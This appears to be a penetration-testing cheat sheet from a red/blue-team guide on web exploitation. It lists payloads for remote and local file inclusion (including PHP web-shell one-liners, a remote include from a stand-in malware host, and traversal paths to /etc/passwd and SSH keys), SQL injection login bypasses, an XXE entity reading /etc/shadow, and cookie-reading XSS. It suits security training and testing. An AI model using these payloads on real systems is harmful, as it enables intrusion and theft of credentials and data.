# TABLE OF CONTENTS
1. [GENERAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation_General.md#general)
2. [FILE INCLUSION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation_General.md#file-inclusion)
3. [SQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation_General.md#sql)
4. [XML](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation_General.md#xml)
5. [XSS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation_General.md#xss)

# GENERAL
## Search Exploits
- google --> <service_name> [version] exploit
- shodan --> https://exploits.shodan.io/
- searchsploit (= ExploitDB lookup) --> CLI Example: `searchsploit apache mod_ssl`
- msf: `search platform:windows port:135 target:XP type:exploit`

<br />

# File Inclusion
## Remote
- **Attacker uploads file from external source**
- *PHP functions in scope: **allow_url_include** and **allow_url_fopen**

### Examples
1. Inject remote file from own server: https://example.com/login.php?user=http://malware.bad/malicious.php
2. Inject malicious script: https://example.com/login.php?user=malicious.php

### Code to check while enumerating RFI
- `<?php phpinfo() ?>`
- `<?php system("whoami"); ?>`
- ```<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>```
- ```<?php $c=$_GET[‘c’]; echo `$c`; ?>```
- `<?php passthru($_GET['cmd']); ?>`
- `<?php echo shell_exec("whoami");?>` For shell_exec to output the result you need to echo it

## Local 
- **Attacker retrieves file that already exists on hosting server**
- **If LFI is existing, you can see the source code interpreted by the server**

### Tips
1. Null Byte Attack
   - https://example.com/login.php?user=../../Windows/system32/cmd.exe%00
   - http://example.com/index.html?page=../../../../../var/www/html/restricted/.htaccess%00
   - http://example.com/index.html?page=../../../../../var/www/html/restricted/.htpasswd%00
   - %00 terminates string to avoid adherence of specific extension (e.g. .php)
2. Base64 encoded
   - ?user=php://filter/read=convert.base64-encode/resource=/etc/passwd
   - Decode the response to get target output
3. Fuzzing via Burpsuite Intruder (Directory Traversal)
4. LFI Suite:
   - [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)

### Files to check while enumerating LFI
- `../../../../../../../etc/passwd`
- `../../../../../../../home/<users>/.ssh/authorized_keys`
- `../../../../../../../home/<users>/.ssh/bash_history`
- To get the username of who we’re running as: `../../../../../../../proc/self/environ`
- To see what binary is running this service: `../../../../../../../proc/self/cmdline`
- index.php / config.php / settings.php / php.ini

##  Best Practice
- Input Validation (Whitelisting allowed file extensions)
- Exclude the directory separators “/” 
- Patch php version regularly

<br />

# SQL
**>> Full Cheat Sheet: [www.netsparker.com/blog](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)**

## SQL Types
1. MySQL
2. SQL Server
3. PostgreSQL
4. Oracle
5. Others

## SQL Injection: Quick and Dirty
```
admin' --
admin' #
admin'/*
' or 1='1
' or 1=1--
' or 1=1#
' or 1=1/*
') or ‘1’ =’1--
') or (‘1’=’1--
' || 1=’1
```

## SQL Attack Patterns
#### Comment
```
1) --
2) /*  */
3) #
```

#### Combine Queries 
- `SELECT * FROM xyz ; SELECT * FROM abc`

#### UNION injections
- You can poison query to return records from different tables
- `SELECT username, admin FROM members UNION SELECT password, admin FROM members`


## Tools
#### mssqlclient.py
- `python3 mssqlclient.py USER@10.10.10.27 -windows-auth`
- `SELECT IS_SRVROLEMEMBER('sysadmin')`
   - Output "1" = yes

#### sqlmap
- Check out: [3_Exploitation/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/3_Exploitation/Web%20Application.md)

<br />

# XML
## Missing Encryption/Input Validation
- XML data vulnerable to spoofing /request forgery / code injection

## XML Bomb
- Entities that expand to exponential size, consuming memory (DoS!)

## XML External Entity (XXE)
- Embeds a request for a local resource
- File Inclusion within XML
  - `<!ENTITY runcode SYSTEM "/etc/shadow">`

<br />

# XSS
## XSS Types

*Attacker embeds malicious scripting commands on a trusted website*

1. **Reflected XSS**
- non-persistent effect activated by a victim clicking a link
- Example: `https://example.com/search?q=<script%20type='application/js'>alert('xss')</script>`
2. **Stored/Persistent XSS**
- Attempts to store data persistently on the web server
3. **DOM-based XSS**
- Attempt to exploit the victim's web browser
- Example: `https://example.com/index.html#default=<script>alert(document.cookie)</script>`

## Attack Patterns
```
<script>alert("XSS LEAK")</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(2)>
```
